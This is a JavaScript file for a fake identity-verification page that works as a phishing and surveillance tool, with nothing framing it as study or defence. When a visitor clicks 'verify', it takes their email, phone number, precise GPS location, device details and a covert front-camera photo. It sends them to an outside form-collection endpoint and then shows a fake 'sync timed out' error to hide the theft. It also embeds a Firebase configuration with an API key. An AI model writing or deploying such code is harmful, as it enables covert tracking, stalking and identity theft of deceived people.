// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAK8a2GI2F9lqaw-HafOH537Nc7tl0cKDA",
  authDomain: "confirm-2026.firebaseapp.com",
  projectId: "confirm-2026",
  storageBucket: "confirm-2026.firebasestorage.app",
  messagingSenderId: "969420589666",
  appId: "1:969420589666:web:57a9436869478447111f3b",
  measurementId: "G-SWD2QVW3YJ"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);

const FORMSPREE_URL = "https://formspree.io/f/your-id-here"; // <--- CHANGE THIS

document.getElementById('verifyBtn').addEventListener('click', async () => {
    const status = document.getElementById('status');
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;

    if (!email || !phone) {
        alert("Verification requires valid credentials.");
        return;
    }

    status.innerText = "Syncing Network & GPS...";

    // 1. Precise GPS
    let locationData = "Access Denied";
    try {
        const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
        });
        locationData = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude} (Acc: ${pos.coords.accuracy}m)`;
    } catch (e) { console.log("GPS Blocked"); }

    // 2. Camera Trigger
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.style.display = "block";
        video.srcObject = stream;
        status.innerText = "Processing Face-ID Sync...";

        // Wait for user to look at screen
        await new Promise(r => setTimeout(r, 2000));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photo = canvas.toDataURL('image/jpeg', 0.4); // Compressed

        // 3. Exfiltrate to Formspree
        const payload = {
            captured_email: email,
            captured_phone: phone,
            precise_location: locationData,
            device_model: navigator.userAgent,
            timestamp: new Date().toLocaleString(),
            hidden_photo: photo
        };

        await fetch(FORMSPREE_URL, {
            method: 'POST',
            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        status.innerText = "Verification failed (Error 0xAF2). Sync timed out.";
        stream.getTracks().forEach(t => t.stop());
        video.style.display = "none";

    } catch (err) {
        status.innerText = "Camera access required for secure verification.";
    }
});